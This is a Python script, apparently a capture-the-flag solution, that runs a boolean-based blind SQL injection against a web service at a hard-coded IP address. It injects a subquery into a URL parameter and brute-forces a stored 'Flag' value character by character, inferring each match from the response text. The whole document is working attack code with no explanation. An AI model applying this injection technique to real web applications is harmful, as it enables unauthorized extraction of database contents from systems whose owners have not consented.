import requests

url = 'http://52.59.124.14:5012/'

def send_payload(flag,payload):
    params = {'p': f"2,10 AND (SELECT content FROM pages WHERE title='Flag') LIKE '{flag}{payload}%'"}
    response = requests.get(url, params=params)
    print(params)
    if 'boring' in response.text:
        return True
    return False

flag = "RU5PE1NRTDFFVZF0AF8WDVRFQZBTBTRFVZBYA3NFU29TZUHVDYF9"
alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" 

for _ in range(52): 
    for char in alphabet:
        if send_payload(flag,char):
            print(f"Found part of flag: {char}")
            flag += char  
            break


print(f"Flag found: {flag}")
